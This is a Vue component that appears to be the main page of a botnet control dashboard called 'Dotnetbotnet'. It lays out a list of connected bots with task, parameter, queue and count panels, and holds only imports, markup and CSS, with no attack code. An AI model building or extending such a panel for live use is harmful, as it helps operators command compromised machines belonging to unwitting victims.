<script setup>
import Header from './components/general/Header.vue'
import BotsList from './components/botslistsection/BotsList.vue'
import SectionTitle from './components/botslistsection/SectionTitle.vue'
import Count from './components/bottom/count/Count.vue'
import Params from './components/bottom/params/Params.vue'
import Queue from './components/bottom/queue/Queue.vue'
import TaskMenu from './components/bottom/tasks/TaskMenu.vue'
</script>

<template>
  <!-- Header of the page -->
  <div class="wrapper">
    <Header msg="Dotnetbotnet Overview" />
  </div>

  <!-- Main content section -->
  <div class="botlistsection">
    <SectionTitle msg="List of Connected Bots"/>
    <BotsList></BotsList>
  </div>

  <div class="flex-container">
    <Count />
    <TaskMenu />
    <Params />
    <Queue />
  </div>

</template>

<style scoped>
.botlistsection {
  max-width: 40%;
  min-width: 40%;
  margin-left: 1%;
}
.flex-container{
  position: absolute;
  bottom: 0;
  display: flex;
  flex-direction: row;
  justify-content: center;
  align-items: flex-end;
  margin: 20px;
}
</style>
